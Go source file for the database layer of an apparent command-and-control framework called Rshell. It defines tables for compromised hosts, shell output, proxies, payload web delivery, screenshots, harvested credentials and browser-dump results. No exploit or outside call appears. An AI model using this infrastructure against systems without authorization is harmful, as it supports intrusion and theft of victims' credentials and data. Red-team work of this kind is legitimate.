package database

import (
	"Rshell/pkg/logger"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"time"

	_ "modernc.org/sqlite"
	"xorm.io/xorm"
)

var Engine *xorm.Engine
var DatabaseName string

type Users struct {
	Username string
	Password string
	//Email       string
	//Phone       string
	//Permissions int
}
type Clients struct {
	Uid        string
	FirstStart string
	ExternalIP string
	InternalIP string
	Username   string
	Computer   string
	Process    string
	Pid        string
	Address    string
	Arch       string
	Note       string
	Sleep      string
	Online     string
	Color      string
	PublicKey  string
}
type Notes struct {
	Uid  string
	Note string
}
type Shell struct {
	Uid          string
	ShellContent string
}
type Socks5 struct {
	Uid        string
	Type       string
	Socks5port string
	UserName   string
	Password   string
	Status     int
}

type Downloads struct {
	Uid            string
	FileName       string
	FilePath       string
	FileSize       int
	DownloadedSize int
}
type Listener struct {
	Type           string
	ListenAddress  string
	ConnectAddress string
	Status         int
}
type WebDelivery struct {
	ListenerConfig string
	OS             string
	Arch           string
	ListeningPort  string
	Status         int
	ServerAddress  string
	FileName       string
	Pass           string
}
type Settings struct {
	Name  string
	Value string
}
type Key struct {
	PublicKey  string
	PrivateKey string
}
type Plugin struct {
	Id         int64 `xorm:"pk autoincr"`
	Name       string
	Os         string
	Type       string
	FileName   string
	FilePath   string
	UploadTime int64
}
type Screenshots struct {
	Id        int64  `xorm:"pk autoincr"`
	Uid       string
	FileName  string
	FilePath  string
	CreatedAt int64
}
type Credentials struct {
	Id        int64  `xorm:"pk autoincr" json:"id"`
	Uid       string `json:"uid"`
	Target    string `json:"target"`
	Username  string `json:"username"`
	Secret    string `json:"secret"`
	CredType  string `json:"cred_type"`
	Source    string `json:"source"`
	Notes     string `json:"notes"`
	CreatedAt int64  `json:"created_at"`
}
type CredentialDumps struct {
	Id        int64  `xorm:"pk autoincr" json:"id"`
	Uid       string `json:"uid"`
	FileName  string `json:"fileName"`
	FilePath  string `json:"filePath"`
	FileSize  int64  `json:"fileSize"`
	CreatedAt int64  `json:"createdAt"`
}
type SensitiveResults struct {
	Id         int64  `xorm:"pk autoincr" json:"id"`
	Uid        string `json:"uid"`
	SearchPath string `json:"searchPath"`
	Content    string `json:"content"`
	CreatedAt  int64  `json:"createdAt"`
}
type DumpBrowserResults struct {
	Id          int64  `xorm:"pk autoincr" json:"id"`
	Uid         string `json:"uid"`
	BrowserName string `json:"browserName"`
	Category    string `json:"category"`
	Content     string `json:"content"`
	CreatedAt   int64  `json:"createdAt"`
}
func generateInitialAdminPassword(length int) (string, error) {
	if length <= 0 {
		length = 20
	}

	const alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789!@#$%^&*_-+="
	buf := make([]byte, length)
	randomBytes := make([]byte, length)

	if _, err := rand.Read(randomBytes); err != nil {
		return "", fmt.Errorf("failed to generate random password: %v", err)
	}

	for i := range buf {
		buf[i] = alphabet[int(randomBytes[i])%len(alphabet)]
	}

	return string(buf), nil
}

func ConnectDateBase() {
	var err error
	// 获取当前程序所在目录
	exePath, err := os.Executable()
	if err != nil {
		logger.Fatalf("获取程序路径失败: %v", err)
	}

	// 获取程序所在目录
	exeDir := filepath.Dir(exePath)

	// 设置数据库路径为程序所在目录下的 database.db
	DatabaseName = filepath.Join(exeDir, "database.db")

	Engine, err = xorm.NewEngine("sqlite", DatabaseName)
	if err != nil {
		logger.Fatalf("连接sqlite数据库失败: %v", err)
	}
	err = Engine.Sync2(new(Users), new(Clients), new(Notes), new(Shell), new(Downloads), new(Listener), new(WebDelivery), new(Socks5), new(Settings), new(Key), new(Plugin), new(Screenshots), new(Credentials), new(CredentialDumps), new(SensitiveResults), new(DumpBrowserResults))
	if err != nil {
		logger.Fatalf("初始化数据库失败: %v", err)
	}
	var user Users
	exists, err := Engine.Where("username = ?", "admin").Get(&user)
	if err != nil {
		logger.Fatalf("查询 admin 用户失败: %v", err)
	}
	if !exists {
		initialPassword, err := generateInitialAdminPassword(20)
		if err != nil {
			logger.Fatalf("生成初始 admin 密码失败: %v", err)
		}

		// 如果不存在 admin 用户，插入默认的 admin 用户
		// 当 admin 用户不存在时，改为生成随机初始密码并写入数据库。
		defaultUser := &Users{
			Username: "admin",
			Password: initialPassword,
			//Email:       "admin@example.com",
			//Phone:       "1234567890",
			//Permissions: 1,
		}

		err = InsertData(Engine, defaultUser)
		if err != nil {
			logger.Error(fmt.Sprintf("插入默认 admin 用户失败: %v", err))
			os.Exit(0)
		}

		logger.Warn("admin user not found,init......")
		logger.Warnf("account: %s", "admin")
		logger.Warnf("password: %s", initialPassword)
	}
	defaultSettings := map[string]string{
		"wecom":    "{}", // Changed to json format to support multiple options like URL and enabled, but keeping compatible as much as possible
		"dingtalk": "{}",
		"telegram": "{}",
		"email":    "{}",
	}

	for k, v := range defaultSettings {
		var Setting Settings
		exists, err = Engine.Where("name=?", k).Get(&Setting)
		if !exists {
			defaultSetting := &Settings{
				Name:  k,
				Value: v,
			}
			err = InsertData(Engine, defaultSetting)
			if err != nil {
				logger.Error(err.Error())
				os.Exit(0)
			}
		}
	}

	var mcpSetting Settings
	exists, err = Engine.Where("name=?", "mcp_enabled").Get(&mcpSetting)
	if !exists {
		defaultMcpSetting := &Settings{
			Name:  "mcp_enabled",
			Value: "false",
		}
		err = InsertData(Engine, defaultMcpSetting)
		if err != nil {
			logger.Error(err.Error())
			os.Exit(0)
		}
	}
}

// InsertData 函数用于插入任意表的数据
func InsertData(engine *xorm.Engine, table interface{}) error {
	// 使用反射获取表的信息
	valueOfTable := reflect.ValueOf(table)
	if valueOfTable.Kind() != reflect.Ptr || valueOfTable.Elem().Kind() != reflect.Struct {
		return fmt.Errorf("table parameter must be a pointer to a struct")
	}

	// 同步数据库结构
	err := engine.Sync2(table)
	if err != nil {
		return fmt.Errorf("failed to sync database structure: %v", err)
	}

	// 插入数据
	_, err = engine.Insert(table)
	if err != nil {
		return fmt.Errorf("failed to insert data: %v", err)
	}

	return nil
}
func SaveDumpBrowserChunk(uid string, browserName string, category string, content string) {
	// Try to parse browserName and category from the JSON content
	if browserName == "" || category == "" {
		var parsed struct {
			Browser  string `json:"browser"`
			Category string `json:"category"`
		}
		if err := json.Unmarshal([]byte(content), &parsed); err == nil {
			if browserName == "" {
				browserName = parsed.Browser
			}
			if category == "" {
				category = parsed.Category
			}
		}
	}

	Engine.Insert(&DumpBrowserResults{
		Uid:         uid,
		BrowserName: browserName,
		Category:    category,
		Content:     content,
		CreatedAt:   time.Now().Unix(),
	})
}

func SaveSensitiveChunk(uid string, data string) {
	Engine.Insert(&SensitiveResults{
		Uid:       uid,
		Content:   data,
		CreatedAt: time.Now().Unix(),
	})
}

func ExecuteSQL(engine *xorm.Engine, sql string, args ...interface{}) error {
	_, err := engine.Exec(sql, args)
	if err != nil {
		return fmt.Errorf("failed to execute SQL: %v", err)
	}
	return nil
}
func QuerySQL(engine *xorm.Engine, sql string, args ...interface{}) ([]map[string]string, error) {
	results, err := engine.QueryString(sql, args)
	if err != nil {
		return nil, fmt.Errorf("failed to query SQL: %v", err)
	}
	return results, nil
}
